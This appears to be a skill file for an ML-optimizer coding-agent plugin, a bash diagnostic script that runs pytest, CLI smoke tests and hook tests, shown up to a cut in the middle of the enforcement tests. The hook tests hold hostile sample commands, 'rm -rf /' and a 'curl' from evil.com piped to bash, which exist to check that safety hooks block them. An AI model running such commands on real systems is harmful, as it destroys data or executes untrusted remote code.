---
name: run-diagnostic
description: "Run end-to-end diagnostics — validates plugin structure, dispatches all 9 worker agents (10 agent definitions incl. the main-thread orchestrator), tests evolutionary workflow (ShinkaEvolve), and runs a full optimization pipeline on the test fixture."
allowed-tools: "Bash, Read, Write, Edit, Glob, Grep, Agent, Skill, WebSearch, WebFetch"
---

# ML Optimizer End-to-End Diagnostic

Comprehensive diagnostic of the ml-optimizer plugin: validates plugin structure via pytest, exercises all script CLIs, tests hook security boundaries, validates workflow infrastructure (`skills/orchestrate/workflows/phase-{5,6,7,8}-*.js`), confirms all 9 worker agents dispatch (10 agent definitions total, incl. the main-thread orchestrator, which is not a dispatchable subagent), tests the ShinkaEvolve workflow, and runs the full Phase 2→9 pipeline. Phases 0/1, 2, 3, 4, 9 dispatch via `Agent()`; phases 5–8 run as dynamic workflows (`Workflow({scriptPath, args})`) dispatching via `agentType`.

## Step 1: Run full test suite (pytest)

**First:** Detect this plugin's root — the directory containing `scripts/`, `tests/`, `hooks/`, `agents/`. Save as `PLUGIN_ROOT` for all subsequent steps.

Checks (each prints ✓/✗; all run regardless of individual failures):

```bash
PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT}"
export PLUGIN_ROOT
SCRIPTS=$PLUGIN_ROOT/scripts
HOOKS=$PLUGIN_ROOT/hooks
FIX=$PLUGIN_ROOT/tests/fixtures

cd $PLUGIN_ROOT

# Collection guard: verify pytest discovers at least 1100 tests before running.
# Catches accidental test-file deletion or broken test collection that would
# otherwise hide behind a "no failures reported" status.
COLLECTED=$(python3 -m pytest tests/ --collect-only -q 2>&1 | grep -oE '[0-9]+ tests collected' | grep -oE '[0-9]+')
if [ -z "$COLLECTED" ] || [ "$COLLECTED" -lt 1100 ]; then
  echo "✗ [Step 1] pytest collection guard FAILED — expected ≥1100 tests, found '$COLLECTED'"
else
  echo "✓ [Step 1] pytest collection guard: $COLLECTED tests discovered"
fi

# Run the full suite
python3 -m pytest tests/ -v --tb=short 2>&1 | tail -60
```

Runs all 22 test files (~1332 tests, including `test_evolve.py`). Report failures. GPU-related failures on non-GPU machines are acceptable. If `scripts/plot_results.py` fails on missing matplotlib, note and continue. `test_evolve.py` (43 tests) is REQUIRED — its imports are stdlib-only, so it needs only the ShinkaEvolve submodule initialized (not extra deps). If those tests fail to collect, ShinkaEvolve is not set up: run `bash scripts/setup_evolve.sh` to fix it (SSH→HTTPS submodule fallback + verification). Do NOT skip them with `--ignore`.

## Step 2: Script CLI smoke tests

Run each Python script's CLI with minimal inputs — tests argument parsing and basic execution paths, no training needed.

Checks (each prints ✓/✗; all run regardless of individual failures):

```bash
PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT}"
export PLUGIN_ROOT

SCRIPTS=$PLUGIN_ROOT/scripts
FIX=$PLUGIN_ROOT/tests/fixtures
mkdir -p /tmp/ml-opt-cli-test/{results,reports,logs}

echo "=== Script CLI Smoke Tests ==="

# 1. gpu_check.py
python3 $SCRIPTS/gpu_check.py 2>/dev/null && echo "✓ gpu_check" || echo "— gpu_check (no GPU, OK)"

# 2. parse_logs.py — parse fixture logs (standard kv, XGBoost, LightGBM)
python3 $SCRIPTS/parse_logs.py $FIX/sample_train_log.txt > /dev/null \
  && python3 $SCRIPTS/parse_logs.py $FIX/xgboost_session_log.txt > /dev/null \
  && python3 $SCRIPTS/parse_logs.py $FIX/lightgbm_session_log.txt > /dev/null \
  && echo "✓ parse_logs (3 formats)" || echo "✗ parse_logs FAILED"

# 3. detect_divergence.py — healthy values
python3 $SCRIPTS/detect_divergence.py '[0.5, 0.4, 0.35, 0.3]' \
  && echo "✓ detect_divergence (healthy)" || echo "✗ detect_divergence FAILED"

# 4. detect_divergence.py — divergent values with model-category
python3 $SCRIPTS/detect_divergence.py '[0.5, 0.4, 500.0]' --model-category supervised \
  && echo "✓ detect_divergence (divergent)" || echo "✗ detect_divergence FAILED"

# 5. schema_validator.py — error path (non-existent file)
python3 $SCRIPTS/schema_validator.py /tmp/nonexistent.json result 2>/dev/null; \
  echo "✓ schema_validator (error path, exit=$?)"

# 6. prerequisites_check.py — 4 subcommands
python3 $SCRIPTS/prerequisites_check.py detect-env $FIX/tiny_resnet_cifar10 > /dev/null \
  && python3 $SCRIPTS/prerequisites_check.py scan-imports $FIX/tiny_resnet_cifar10 > /dev/null \
  && python3 $SCRIPTS/prerequisites_check.py detect-format-project $FIX/tiny_resnet_cifar10 train.py > /dev/null \
  && python3 $SCRIPTS/prerequisites_check.py bulk-install-cmd $FIX/tiny_resnet_cifar10 conda base > /dev/null \
  && echo "✓ prerequisites_check (4 subcommands)" || echo "✗ prerequisites_check FAILED"

# 7. implement_utils.py — parse proposals + analyze
python3 $SCRIPTS/implement_utils.py $FIX/sample_research_findings.md '[1,2]' > /dev/null \
  && python3 $SCRIPTS/implement_utils.py analyze $FIX/tiny_resnet_cifar10 > /dev/null \
  && echo "✓ implement_utils (parse + analyze)" || echo "✗ implement_utils FAILED"

# 7b. implement_utils.py — diff subcommand (error path, no git repo)
python3 $SCRIPTS/implement_utils.py diff /tmp/ml-opt-cli-test main 2>/dev/null; \
  echo "✓ implement_utils (diff, exit=$?)"

# 8. experiment_setup.py — set up dirs
python3 $SCRIPTS/experiment_setup.py /tmp/ml-opt-cli-test 'python train.py' 0 '{"lr": 0.01}' \
  && echo "✓ experiment_setup" || echo "✗ experiment_setup FAILED"

# 9. pipeline_state.py — save/load/validate/cleanup round-trip
python3 $SCRIPTS/pipeline_state.py /tmp/ml-opt-cli-test save 3 0 \
  && python3 $SCRIPTS/pipeline_state.py /tmp/ml-opt-cli-test load \
  && python3 $SCRIPTS/pipeline_state.py /tmp/ml-opt-cli-test validate 3 \
  && python3 $SCRIPTS/pipeline_state.py /tmp/ml-opt-cli-test cleanup \
  && echo "✓ pipeline_state (save/load/validate/cleanup)" || echo "✗ pipeline_state FAILED"

# 9b. pipeline_state.py — verify-baseline (error path, no baseline checksum)
python3 $SCRIPTS/pipeline_state.py /tmp/ml-opt-cli-test verify-baseline 2>/dev/null; \
  echo "✓ pipeline_state (verify-baseline, exit=$?)"

# 10. error_tracker.py — 12 subcommands
python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test log \
  '{"category":"training_failure","severity":"warning","source":"experiment","message":"smoke test"}' \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test show > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test patterns > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test summary > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test dead-end list > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test dead-end check "label smoothing" > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test agenda list > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test success loss true > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test proposals loss true > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test rank > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test log-suggestion '{"type":"hp","detail":"try lr=0.001"}' > /dev/null \
  && python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-cli-test suggestion-history > /dev/null \
  && echo "✓ error_tracker (12 subcommands)" || echo "✗ error_tracker FAILED"

# 11. goal_memory.py — init, summary, validate, log, query, sync
python3 $SCRIPTS/goal_memory.py /tmp/ml-opt-cli-test init-goals \
  '{"objective":{"primary_metric":"loss","lower_is_better":true},"constraints":{"scope_level":"training"},"divergence":{"metric":"loss","lower_is_better":true}}' \
  && python3 $SCRIPTS/goal_memory.py /tmp/ml-opt-cli-test summary > /dev/null \
  && python3 $SCRIPTS/goal_memory.py /tmp/ml-opt-cli-test validate-output hp-tune '{"configs":[{"lr":0.001}]}' > /dev/null \
  && python3 $SCRIPTS/goal_memory.py /tmp/ml-opt-cli-test log-behavior training_insight '{"insight":"smoke test"}' > /dev/null \
  && python3 $SCRIPTS/goal_memory.py /tmp/ml-opt-cli-test query-behaviors > /dev/null \
  && python3 $SCRIPTS/goal_memory.py /tmp/ml-opt-cli-test sync-from-errors > /dev/null \
  && echo "✓ goal_memory (6 subcommands)" || echo "✗ goal_memory FAILED"

# 12. dashboard.py — empty root + --table flag
python3 $SCRIPTS/dashboard.py /tmp/ml-opt-cli-test \
  && echo "✓ dashboard (empty)" || echo "✗ dashboard FAILED"
python3 $SCRIPTS/dashboard.py /tmp/ml-opt-cli-test --table \
  && echo "✓ dashboard (--table)" || echo "✗ dashboard --table FAILED"

# 13. excalidraw_gen.py — pipeline diagram from empty root
python3 $SCRIPTS/excalidraw_gen.py /tmp/ml-opt-cli-test pipeline loss \
  && echo "✓ excalidraw_gen" || echo "✗ excalidraw_gen FAILED"

# 14. result_analyzer.py — empty results
python3 $SCRIPTS/result_analyzer.py /tmp/ml-opt-cli-test/results loss 2>/dev/null; \
  echo "✓ result_analyzer (empty, exit=$?)"

# 15. plot_results.py — conditional on matplotlib
python3 -c "import matplotlib" 2>/dev/null && \
  python3 $SCRIPTS/plot_results.py /tmp/ml-opt-cli-test/results loss comparison 2>/dev/null \
  && echo "✓ plot_results" || echo "— plot_results (matplotlib missing or empty, OK)"

# 16. round_manager.py (round lifecycle + completeness checks — 10 subcommands)
ROUND_EXP=/tmp/ml-opt-cli-test/round-mgr
mkdir -p $ROUND_EXP
python3 $SCRIPTS/round_manager.py $ROUND_EXP create-round hp > /dev/null \
  && python3 $SCRIPTS/round_manager.py $ROUND_EXP current-round | grep -q '"dir": *"round-1-hp"' \
  && python3 $SCRIPTS/round_manager.py $ROUND_EXP next-id | grep -q '"exp_id": *"exp-001"' \
  && python3 $SCRIPTS/round_manager.py $ROUND_EXP register-experiment round-1-hp exp-001 | grep -q '"registered": *true' \
  && python3 $SCRIPTS/round_manager.py $ROUND_EXP check-round round-1-hp > /dev/null 2>&1; [ $? -eq 2 ] \
  && python3 $SCRIPTS/round_manager.py $ROUND_EXP check-proposals round-1-hp > /dev/null 2>&1; [ $? -eq 2 ] \
  && python3 $SCRIPTS/round_manager.py $ROUND_EXP check-baseline > /dev/null 2>&1; [ $? -eq 2 ] \
  && python3 $SCRIPTS/round_manager.py $ROUND_EXP check-prerequisites > /dev/null 2>&1; [ $? -eq 2 ] \
  && python3 $SCRIPTS/round_manager.py $ROUND_EXP check-manifest > /dev/null 2>&1; [ $? -eq 2 ] \
  && python3 $SCRIPTS/round_manager.py $ROUND_EXP close-round --summary "smoke test" | grep -q '"closed": *true' \
  && echo "✓ round_manager (10 subcommands)" || echo "✗ round_manager FAILED"

# 19. output_contract.py (inject + check subcommands — exercises any_of, required_if rendering)
OC_EXP=/tmp/ml-opt-cli-test/output-contract
mkdir -p $OC_EXP/results $OC_EXP/logs/baseline
echo '{"exp_id":"baseline"}' > $OC_EXP/results/baseline.json
echo "log" > $OC_EXP/logs/baseline/train.log
python3 $SCRIPTS/output_contract.py inject $OC_EXP baseline-agent | grep -q "REQUIRED OUTPUTS" \
  && python3 $SCRIPTS/output_contract.py inject $OC_EXP analysis-agent | grep -q "AT LEAST ONE of" \
  && python3 $SCRIPTS/output_contract.py inject $OC_EXP prerequisites-agent | grep -q "conditional" \
  && python3 $SCRIPTS/output_contract.py check $OC_EXP baseline-agent | grep -q '"complete": *true' \
  && python3 $SCRIPTS/output_contract.py check $OC_EXP report-agent > /dev/null 2>&1; [ $? -eq 2 ] \
  && echo "✓ output_contract (inject × 3 + check × 2)" || echo "✗ output_contract FAILED"

# 20. dev_notes.py (init + append + last-agent subcommands — dev_notes.md running-log writer; --agent-id tags the entry)
DN_EXP=/tmp/ml-opt-cli-test/dev-notes
mkdir -p $DN_EXP
python3 $SCRIPTS/dev_notes.py $DN_EXP init > /dev/null \
  && [ -f $DN_EXP/dev_notes.md ] \
  && python3 $SCRIPTS/dev_notes.py $DN_EXP append baseline-agent "smoke test entry" --agent-id smoke-X > /dev/null \
  && grep -q '<!-- agent_id: smoke-X -->' $DN_EXP/dev_notes.md \
  && python3 $SCRIPTS/dev_notes.py $DN_EXP last-agent | grep -q '"agent_id": *"smoke-X"' \
  && echo "✓ dev_notes (init + append + last-agent)" || echo "✗ dev_notes FAILED"

# 21. setup_evolve.sh (ShinkaEvolve submodule init — must be idempotent)
bash $PLUGIN_ROOT/scripts/setup_evolve.sh > /dev/null 2>&1 \
  && echo "✓ setup_evolve" || echo "✗ setup_evolve FAILED"

# 22. validate_experiment_write.py (PreToolUse hook smoke test — empty stdin should approve)
echo '' | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null | grep -q '"decision": *"approve"' \
  && echo "✓ validate_experiment_write (empty stdin → approve)" \
  || echo "✗ validate_experiment_write FAILED"

# 23. validate_agent_output.py (SubagentStop hook smoke test — empty stdin should approve)
echo '' | python3 $SCRIPTS/validate_agent_output.py 2>/dev/null | grep -q '"decision": *"approve"' \
  && echo "✓ validate_agent_output (empty stdin → approve)" \
  || echo "✗ validate_agent_output FAILED"

rm -rf /tmp/ml-opt-cli-test
echo "=== Script CLI Tests Done ==="
```

Report pass/fail count.

## Step 3: Hook tests

Test every hook in `hooks.json` plus the 3-checkpoint enforcement machinery. Two sub-steps:

- **Step 3.1** — functional tests for the 9 lifecycle hooks (security, compaction, status, state-change detection).
- **Step 3.2** — 3-checkpoint enforcement tests for the 3 output-structure hooks (SubagentStart inject, PreToolUse Write/Edit validate, SubagentStop check) with synthetic stdin covering all validator features (`any_of`, `required_if`, stacked tier, frozen params, OOM cap).

Together these cover all 11 hooks in `hooks.json`.

### Step 3.1: Hook functional tests

Test every hook in `hooks.json` with synthetic JSON stdin. Covers 8 lifecycle hooks (bash-safety, file-guardrail, detect-critical-errors, pre-compact, post-compact-context, stop-check, file-changed-pipeline-state, cwd-changed-detect-experiments). The 3 output-structure enforcement hooks (subagent-start-inject-goals, validate_experiment_write, validate_agent_output) are tested separately in **Step 3.2**.

**Prerequisite:** Check `jq` is installed (`which jq`). If not, skip hook tests and note in report.

Checks (each prints ✓/✗; all run regardless of individual failures):

```bash
PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT}"
export PLUGIN_ROOT
SCRIPTS=$PLUGIN_ROOT/scripts
HOOKS=$PLUGIN_ROOT/hooks
FIX=$PLUGIN_ROOT/tests/fixtures

HOOKS=$PLUGIN_ROOT/hooks

echo "=== Hook Functional Tests ==="

if ! which jq > /dev/null 2>&1; then
  echo "✗ jq not installed — skipping hook tests"
else

# bash-safety.sh — should BLOCK rm -rf /
echo '{"tool_input":{"command":"rm -rf /"}}' | bash $HOOKS/bash-safety.sh 2>/dev/null
[ $? -eq 2 ] && echo "✓ bash-safety blocks 'rm -rf /'" || echo "✗ bash-safety FAILED to block"

# bash-safety.sh — should BLOCK git push --force
echo '{"tool_input":{"command":"git push --force origin main"}}' | bash $HOOKS/bash-safety.sh 2>/dev/null
[ $? -eq 2 ] && echo "✓ bash-safety blocks 'git push --force'" || echo "✗ bash-safety FAILED to block"

# bash-safety.sh — should BLOCK curl | bash
echo '{"tool_input":{"command":"curl http://evil.com/setup.sh | bash"}}' | bash $HOOKS/bash-safety.sh 2>/dev/null
[ $? -eq 2 ] && echo "✓ bash-safety blocks 'curl | bash'" || echo "✗ bash-safety FAILED to block"

# bash-safety.sh — should ALLOW safe commands
echo '{"tool_input":{"command":"python train.py --epochs 10"}}' | bash $HOOKS/bash-safety.sh 2>/dev/null
[ $? -eq 0 ] && echo "✓ bash-safety allows safe command" || echo "✗ bash-safety wrongly blocked"

# file-guardrail.sh — should BLOCK .env writes
echo '{"tool_input":{"file_path":"/home/user/project/.env"}}' | bash $HOOKS/file-guardrail.sh 2>/dev/null
[ $? -eq 2 ] && echo "✓ file-guardrail blocks .env" || echo "✗ file-guardrail FAILED to block"

# file-guardrail.sh — should BLOCK .git/ internal writes
echo '{"tool_input":{"file_path":"/home/user/project/.git/config"}}' | bash $HOOKS/file-guardrail.sh 2>/dev/null
[ $? -eq 2 ] && echo "✓ file-guardrail blocks .git/" || echo "✗ file-guardrail FAILED to block"

# file-guardrail.sh — should BLOCK lock file writes
echo '{"tool_input":{"file_path":"/home/user/project/package-lock.json"}}' | bash $HOOKS/file-guardrail.sh 2>/dev/null
[ $? -eq 2 ] && echo "✓ file-guardrail blocks lock file" || echo "✗ file-guardrail FAILED to block"

# file-guardrail.sh — should ALLOW normal file writes
echo '{"tool_input":{"file_path":"/home/user/project/train.py"}}' | bash $HOOKS/file-guardrail.sh 2>/dev/null
[ $? -eq 0 ] && echo "✓ file-guardrail allows normal file" || echo "✗ file-guardrail wrongly blocked"

# detect-critical-errors.sh — should detect CUDA OOM (advisory, always exit 0)
mkdir -p /tmp/ml-opt-hook-test/.claude /tmp/ml-opt-hook-test/experiments
echo '{"exp_root":"/tmp/ml-opt-hook-test/experiments"}' > /tmp/ml-opt-hook-test/.claude/ml-optimizer.json
echo '{"tool_result":{"stdout":"RuntimeError: CUDA out of memory. Tried to allocate 2.00 GiB","stderr":""},"cwd":"/tmp/ml-opt-hook-test"}' \
  | bash $HOOKS/detect-critical-errors.sh 2>/dev/null
[ $? -eq 0 ] && echo "✓ detect-critical-errors handles OOM" || echo "✗ detect-critical-errors FAILED"

# detect-critical-errors.sh — should detect segfault
echo '{"tool_result":{"stdout":"Segmentation fault (core dumped)","stderr":""},"cwd":"/tmp/ml-opt-hook-test"}' \
  | bash $HOOKS/detect-critical-errors.sh 2>/dev/null
[ $? -eq 0 ] && echo "✓ detect-critical-errors handles segfault" || echo "✗ detect-critical-errors FAILED"

# Note: subagent-stop-hook.sh was removed — SubagentStop is now handled by
# scripts/validate_agent_output.py which is tested in Step 3.2 below.

# pre-compact.sh — should output reminder when pipeline-state.json exists
echo '{"phase":3,"iteration":0,"status":"running"}' > /tmp/ml-opt-hook-test/experiments/pipeline-state.json
echo '{"cwd":"/tmp/ml-opt-hook-test"}' | bash $HOOKS/pre-compact.sh 2>/dev/null | grep -q 'REMINDER'
[ $? -eq 0 ] && echo "✓ pre-compact outputs reminder" || echo "✗ pre-compact FAILED"

# post-compact-context.sh — should output pipeline context summary
echo '{"cwd":"/tmp/ml-opt-hook-test"}' | bash $HOOKS/post-compact-context.sh 2>/dev/null | grep -q 'ML-OPTIMIZER PIPELINE CONTEXT'
[ $? -eq 0 ] && echo "✓ post-compact-context outputs summary" || echo "✗ post-compact-context FAILED"

# post-compact-context.sh — should exit silently when no state file
echo '{"cwd":"/tmp/nonexistent-dir"}' | bash $HOOKS/post-compact-context.sh 2>/dev/null
[ $? -eq 0 ] && echo "✓ post-compact-context silent without state" || echo "✗ post-compact-context FAILED"

# stop-check.sh — should ALLOW stop when no pipeline state
echo '{"cwd":"/tmp/nonexistent-dir"}' | bash $HOOKS/stop-check.sh 2>/dev/null
[ $? -eq 0 ] && echo "✓ stop-check allows stop (no state)" || echo "✗ stop-check FAILED"

# stop-check.sh — should BLOCK stop when experiments exist but no final report
mkdir -p /tmp/ml-opt-hook-test/experiments/results
echo '{"phase":7,"iteration":3,"status":"running"}' > /tmp/ml-opt-hook-test/experiments/pipeline-state.json
echo '{"exp_id":"exp-001","status":"completed"}' > /tmp/ml-opt-hook-test/experiments/results/exp-001.json
echo '{"cwd":"/tmp/ml-opt-hook-test"}' | bash $HOOKS/stop-check.sh 2>/dev/null
[ $? -eq 2 ] && echo "✓ stop-check blocks stop (no report)" || echo "✗ stop-check FAILED to block"

# stop-check.sh — should ALLOW stop when final report exists
mkdir -p /tmp/ml-opt-hook-test/experiments/reports
echo "# Final Report" > /tmp/ml-opt-hook-test/experiments/reports/final-report.md
echo '{"cwd":"/tmp/ml-opt-hook-test"}' | bash $HOOKS/stop-check.sh 2>/dev/null
[ $? -eq 0 ] && echo "✓ stop-check allows stop (report exists)" || echo "✗ stop-check FAILED"

rm -rf /tmp/ml-opt-hook-test

# file-changed-pipeline-state.sh — silent when pipeline-state.json is valid
export CLAUDE_PLUGIN_ROOT=$PLUGIN_ROOT
mkdir -p /tmp/ml-opt-hook-test/.claude /tmp/ml-opt-hook-test/experiments
echo '{"exp_root":"/tmp/ml-opt-hook-test/experiments"}' > /tmp/ml-opt-hook-test/.claude/ml-optimizer.json
echo '{"phase":3,"iteration":0}' > /tmp/ml-opt-hook-test/experiments/pipeline-state.json
OUT=$(echo '{"cwd":"/tmp/ml-opt-hook-test"}' | bash $HOOKS/file-changed-pipeline-state.sh 2>&1)
[ $? -eq 0 ] && [ -z "$OUT" ] \
  && echo "✓ file-changed-pipeline-state silent on valid state" \
  || echo "✗ file-changed-pipeline-state FAILED on valid state"

# file-changed-pipeline-state.sh — warns on corrupt JSON
echo 'NOT JSON' > /tmp/ml-opt-hook-test/experiments/pipeline-state.json
OUT=$(echo '{"cwd":"/tmp/ml-opt-hook-test"}' | bash $HOOKS/file-changed-pipeline-state.sh 2>&1)
[ $? -eq 0 ] && echo "$OUT" | grep -q "corrupt" \
  && echo "✓ file-changed-pipeline-state warns on corrupt JSON" \
  || echo "✗ file-changed-pipeline-state FAILED to warn on corrupt JSON"

# file-changed-pipeline-state.sh — silent when no exp_root
OUT=$(echo '{"cwd":"/tmp/nonexistent-dir-xyz"}' | bash $HOOKS/file-changed-pipeline-state.sh 2>&1)
[ $? -eq 0 ] && [ -z "$OUT" ] \
  && echo "✓ file-changed-pipeline-state silent without exp_root" \
  || echo "✗ file-changed-pipeline-state FAILED without exp_root"

rm -rf /tmp/ml-opt-hook-test

# cwd-changed-detect-experiments.sh — announces resume when state exists
mkdir -p /tmp/ml-opt-hook-test/.claude /tmp/ml-opt-hook-test/experiments
echo '{"exp_root":"/tmp/ml-opt-hook-test/experiments"}' > /tmp/ml-opt-hook-test/.claude/ml-optimizer.json
echo '{"phase":7,"iteration":3,"user_choices":{"primary_metric":"loss"}}' > /tmp/ml-opt-hook-test/experiments/pipeline-state.json
OUT=$(echo '{"cwd":"/tmp/ml-opt-hook-test"}' | bash $HOOKS/cwd-changed-detect-experiments.sh 2>&1)
[ $? -eq 0 ] && echo "$OUT" | grep -q 'Existing optimization found' \
  && echo "✓ cwd-changed-detect-experiments announces existing optimization" \
  || echo "✗ cwd-changed-detect-experiments FAILED to announce"

# cwd-changed-detect-experiments.sh — silent without exp_root
OUT=$(echo '{"cwd":"/tmp/nonexistent-dir-xyz"}' | bash $HOOKS/cwd-changed-detect-experiments.sh 2>&1)
[ $? -eq 0 ] && [ -z "$OUT" ] \
  && echo "✓ cwd-changed-detect-experiments silent without exp_root" \
  || echo "✗ cwd-changed-detect-experiments FAILED to stay silent"

rm -rf /tmp/ml-opt-hook-test

fi
echo "=== Hook Tests Done ==="
```

Report pass/fail count.

### Step 3.2: 3-checkpoint output structure enforcement

Test the 3 hooks enforcing documented output structure for every agent dispatch, using a synthetic experiment directory under `/tmp`. All 3 enforcement layers (SubagentStart inject, PreToolUse Write/Edit validate, SubagentStop check) are exercised with mock stdin — no live agent dispatch required.

**Prerequisite:** `jq` installed (checked in Step 3.1). Set `$SCRIPTS` and `$HOOKS` to the plugin directories.

Checks (each prints ✓/✗; all run regardless of individual failures):

```bash
PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT}"
export PLUGIN_ROOT
# NOTE: no `set -e` — the checks use && / || and must all run.

SCRIPTS=$PLUGIN_ROOT/scripts
HOOKS=$PLUGIN_ROOT/hooks
ENFORCE_EXP=/tmp/ml-opt-enforce-test
rm -rf $ENFORCE_EXP
mkdir -p $ENFORCE_EXP/.claude
mkdir -p $ENFORCE_EXP/experiments/results
mkdir -p $ENFORCE_EXP/experiments/logs
mkdir -p $ENFORCE_EXP/experiments/scripts
mkdir -p $ENFORCE_EXP/experiments/artifacts
mkdir -p $ENFORCE_EXP/experiments/reports
echo '{"exp_root":"'$ENFORCE_EXP'/experiments"}' > $ENFORCE_EXP/.claude/ml-optimizer.json

echo "=== 3-Checkpoint Enforcement Tests ==="

# --- LAYER 1: SubagentStart contract injection ---

# baseline-agent: regular path contract
INJECTED=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:baseline-agent"}' \
  | CLAUDE_PLUGIN_ROOT=$PLUGIN_ROOT $HOOKS/subagent-start-inject-goals.sh 2>/dev/null)
echo "$INJECTED" | grep -q "results/baseline.json" \
  && echo "$INJECTED" | grep -q "logs/baseline/train.log" \
  && echo "✓ L1 injects baseline-agent contract (path + log)" \
  || echo "✗ L1 FAILED for baseline-agent"

# analysis-agent: any_of rendering
INJECTED=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:analysis-agent"}' \
  | CLAUDE_PLUGIN_ROOT=$PLUGIN_ROOT $HOOKS/subagent-start-inject-goals.sh 2>/dev/null)
echo "$INJECTED" | grep -q "AT LEAST ONE of" \
  && echo "$INJECTED" | grep -q "batch-\*-analysis.md" \
  && echo "$INJECTED" | grep -q "session-review.md" \
  && echo "✓ L1 renders analysis-agent any_of (batch | session-review)" \
  || echo "✗ L1 FAILED any_of rendering"

# prerequisites-agent: required_if rendering
INJECTED=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:prerequisites-agent"}' \
  | CLAUDE_PLUGIN_ROOT=$PLUGIN_ROOT $HOOKS/subagent-start-inject-goals.sh 2>/dev/null)
echo "$INJECTED" | grep -q "conditional" \
  && echo "$INJECTED" | grep -q "dataset.prepared" \
  && echo "✓ L1 renders prerequisites-agent required_if (dataset.prepared)" \
  || echo "✗ L1 FAILED required_if rendering"

# --- LAYER 2: PreToolUse Write/Edit validation ---
# validate_experiment_write.py always exits 0; the decision is in stdout JSON:
#   {"decision":"approve"} or {"decision":"block","reason":"..."}
# The Claude Code harness reads the JSON and applies the block.

# L2 helper: uses Python json.dumps to generate correctly-escaped payloads
# (avoids shell escaping issues with nested JSON in content fields)
l2_payload() {
  python3 -c "
import json, sys
content = json.loads(sys.argv[1])
payload = {'cwd': '$ENFORCE_EXP', 'tool_name': 'Write', 'tool_input': {
    'file_path': sys.argv[2], 'content': json.dumps(content)
}}
print(json.dumps(payload))
" "$1" "$2"
}

# Valid experiment result in round subdir → approve
mkdir -p $ENFORCE_EXP/experiments/results/round-1-hp
L2_OUT=$(l2_payload '{"exp_id":"exp-001","status":"completed","config":{"lr":0.01},"metrics":{"loss":0.4},"iteration":1,"method_tier":"baseline","duration_seconds":120.0}' "$ENFORCE_EXP/experiments/results/round-1-hp/exp-001.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"approve"' \
  && echo "✓ L2 allows valid round-based result" \
  || echo "✗ L2 wrongly blocked valid write"

# Missing completeness fields (status=completed without iteration/method_tier/duration_seconds) → block
L2_OUT=$(l2_payload '{"exp_id":"exp-002","status":"completed","config":{},"metrics":{"loss":0.4}}' "$ENFORCE_EXP/experiments/results/round-1-hp/exp-002.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"block"' \
  && echo "$L2_OUT" | grep -q "mandatory fields" \
  && echo "✓ L2 blocks incomplete status=completed" \
  || echo "✗ L2 FAILED to block missing completeness fields"

# Write directly to results/ (not round subdir) → block
L2_OUT=$(l2_payload '{"exp_id":"exp-003","status":"completed","iteration":1,"method_tier":"baseline","duration_seconds":10,"config":{},"metrics":{}}' "$ENFORCE_EXP/experiments/results/exp-003.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"block"' \
  && echo "$L2_OUT" | grep -q "round subdirectory" \
  && echo "✓ L2 blocks flat results/ write (must be round subdir)" \
  || echo "✗ L2 FAILED to block flat path"

# Placeholder write (status: running) → approve
L2_OUT=$(l2_payload '{"exp_id":"exp-004","status":"running","config":{},"metrics":{}}' "$ENFORCE_EXP/experiments/results/round-1-hp/exp-004.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"approve"' \
  && echo "✓ L2 allows placeholder status=running (no completeness check)" \
  || echo "✗ L2 wrongly blocked placeholder"

# Stacked tier missing code_branches + stacking_order → block
mkdir -p $ENFORCE_EXP/experiments/results/round-1-stacked
L2_OUT=$(l2_payload '{"exp_id":"exp-010","status":"completed","config":{},"metrics":{"loss":0.3},"iteration":1,"method_tier":"stacked_default_hp","duration_seconds":60}' "$ENFORCE_EXP/experiments/results/round-1-stacked/exp-010.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"block"' \
  && echo "$L2_OUT" | grep -q "code_branches" \
  && echo "$L2_OUT" | grep -q "stacking_order" \
  && echo "✓ L2 blocks stacked_ tier missing code_branches/stacking_order" \
  || echo "✗ L2 FAILED to block incomplete stacked tier"

# Failed without notes → block
L2_OUT=$(l2_payload '{"exp_id":"exp-011","status":"failed","config":{},"metrics":{}}' "$ENFORCE_EXP/experiments/results/round-1-hp/exp-011.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"block"' \
  && echo "$L2_OUT" | grep -q "notes" \
  && echo "✓ L2 blocks failed status without notes field" \
  || echo "✗ L2 FAILED to require notes for failed"

# Diverged WITH notes → approve
L2_OUT=$(l2_payload '{"exp_id":"exp-012","status":"diverged","config":{},"metrics":{},"notes":"NaN at step 50"}' "$ENFORCE_EXP/experiments/results/round-1-hp/exp-012.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"approve"' \
  && echo "✓ L2 allows diverged status with notes field" \
